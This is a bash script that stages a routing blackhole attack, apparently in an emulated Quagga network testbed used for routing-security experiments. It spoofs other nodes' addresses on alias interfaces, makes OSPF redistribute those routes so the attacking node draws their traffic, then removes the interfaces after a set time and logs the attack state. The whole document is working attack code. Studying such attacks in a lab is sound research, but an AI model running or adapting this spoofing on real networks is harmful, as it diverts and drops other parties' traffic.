#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5


bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

identifyRoutingProtocol()
{
	# Now check the routing protocol running  
	cd var.run.quagga/
	routingProcotolsRunning=`ls -1 | grep -v zebra.pid | grep pid | wc -l`	
	if [ "$routingProcotolsRunning" -ne 1 ]
	then
		echo "spoof_"$ipToSpoof "Error: Multiple Routing Procols Running $routingProcotolsRunning" > $logPath/attack.txt	
		echo "Multiple routing protocols"
		exit
	fi
	
	#if ospf used in log path
	if [[ $logPath == *"OSPF"* ]]
	then
		sleep 5
		vtysh <<< $'configure terminal \n router ospf \n redistribute connected'
		echo "sent vtysh cmd"
	fi

}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
		then
			#check for protocol
			if [[ -n "$6" && "IPv6" -eq "$6" ]]
				then
				protocol="IPv6"
				ipToSpoof="2001:""$nodeToSpoof""::2"	
				ifconfig eth0:$nodeToSpoof inet6 add "$ipToSpoof/120" up
			else
				protocol="IPv4" 
				ipToSpoof="$nodeToSpoof.0.0.2"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
			fi
			echo "$protocol" ":" "$ipToSpoof"
			echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
echo "sleep startime:" "$startTime"
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "starting blackhole"
		echo "blackHole" > $logPath/attack.txt

		bringUpInterfaces
		identifyRoutingProtocol
		sleep $pendingDuration
		bringDownInterfaces
fi
echo "none" > $logPath/attack.txt

